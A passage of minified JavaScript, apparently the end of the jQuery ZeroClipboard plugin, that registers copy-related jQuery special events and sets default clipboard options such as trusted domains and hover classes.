f=a.extend(!0,{},b,{type:"aftercopy",data:a.extend(!0,{},e),success:d});c.trigger(f)}))}},_default:function(){return!0},options:{requirePreventDefault:!0,autoConvertHtmlToRtf:!0,trustedDomains:o,hoverClass:"hover",activeClass:"active"}};a.event.special.beforecopy=p,a.event.special.copy=p,a.event.special.aftercopy=p,a.event.special["copy-error"]=p}(jQuery,function(){return this||b}()),d||delete b.ZeroClipboard}(jQuery,function(){return this||window}());
